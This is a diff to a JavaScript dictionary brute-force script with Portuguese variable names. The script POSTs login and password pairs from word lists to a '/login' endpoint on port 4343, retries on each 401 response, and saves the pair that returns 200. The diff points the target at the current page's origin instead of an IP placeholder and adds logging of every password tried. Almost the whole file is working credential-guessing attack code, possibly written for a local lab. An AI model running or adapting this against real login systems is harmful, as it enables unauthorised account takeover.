@@ -6,16 +6,17 @@ const dicionario = {
 let data = {};
 let find = {};
 
-const ip = 'SEU_IP';
-const urlAlvo = `http://${ip}:4343/login`;
+const url =  window.location.origin || 'http://localhost:4343';
+const urlAlvo = `${url}/login`;
 
-let l = 0, s = 0;
+let login = 0, pwd = 0;
 let count = 0;
 a();
 function a() {
     count++;
-    data.login = dicionario.logins[l];
-    data.senha = dicionario.senhas[s];
+    data.login = dicionario.logins[login];
+    data.senha = dicionario.senhas[pwd];
+    console.log(`Tentativa nº ${count} :::: Testando senha: '${data.senha}'  `);
     $.ajax({
         url: urlAlvo,
         type: 'POST',
@@ -25,18 +26,18 @@ function a() {
         statusCode: {
             200: () => {
                 bad = false;
-                find.login = dicionario.logins[l];
-                find.senha = dicionario.senhas[s];
+                find.login = dicionario.logins[login];
+                find.senha = dicionario.senhas[pwd];
                 b();
             },
             401: () => {
-                if (l++ > dicionario.logins.length) {
-                    l = 0;
-                    if (s++ > dicionario.senhas.length) {
-                        s = 0;
+                if (login++ > dicionario.logins.length) {
+                    login = 0;
+                    if (pwd++ > dicionario.senhas.length) {
+                        pwd = 0;
                     }
                 }
-                if (l >= dicionario.logins.length && s >= dicionario.senhas.length) {
+                if (login >= dicionario.logins.length && pwd >= dicionario.senhas.length) {
                     b();
                 } else {
                     a();
